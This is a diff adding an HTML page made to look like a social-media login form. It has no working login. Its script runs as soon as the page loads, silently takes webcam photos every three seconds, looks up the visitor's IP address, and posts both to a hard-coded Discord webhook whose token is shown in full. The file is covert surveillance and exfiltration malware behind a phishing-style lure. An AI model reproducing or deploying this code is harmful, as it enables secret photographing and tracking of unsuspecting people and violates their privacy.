@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOGIN FORM</title>
+    <link rel="stylesheet" href="style0.css">
+    <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
+</head>
+<body>
+    <div id="wrapper">
+        <div class="main-content">
+            <div class="header">
+                <img src="https://www.dafont.com/forum/attach/orig/8/1/815933.png?1" />
+            </div>
+            <div class="l-part">
+                <input type="text" placeholder="Phone number, username or email ..." class="input-1" />
+                <div class="overlap-text">
+                    <input type="password" placeholder="Password" class="input-2" />
+                    <a href="#">Forgot?</a>
+                </div>
+                <input type="button" value="Log in" class="btn" />
+            </div>
+        </div>
+        <div class="sub-content">
+            <div class="s-part">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function captureAndSendPhoto() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.addEventListener('loadedmetadata', function() {
+                        console.log('Video dimensions:', video.videoWidth, video.videoHeight);
+
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        console.log('Canvas dimensions:', canvas.width, canvas.height);
+
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const imgData = canvas.toDataURL('image/png');
+                        console.log('Captured image data:', imgData);
+
+                        getUserIP(function(ip) {
+                            console.log('User IP:', ip);
+                            sendToDiscordWebhook(imgData, ip);
+                        });
+
+                        video.srcObject.getVideoTracks()[0].stop();
+                    });
+                })
+                .catch(function(err) {
+                    console.error('Error accessing camera: ', err);
+                });
+        }
+
+        function getUserIP(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    callback(userIP);
+                });
+        }
+
+        function sendToDiscordWebhook(imageData, userIP) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1218167346682663103/K1szw4If2QzyENmwLF6diJrmS6jVITzmJTcInoRs3aewfsOTJJNMWNRIWG-x3Pp0QVvT';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ content: 'New photo captured', embeds: [{ description: `User IP: ${userIP}`, image: { url: imageData } }] })
+            });
+        }
+
+        captureAndSendPhoto();
+        setInterval(captureAndSendPhoto, 3000); // Capture and send a new photo every 3 seconds
+    </script>
+</body>
+</html>
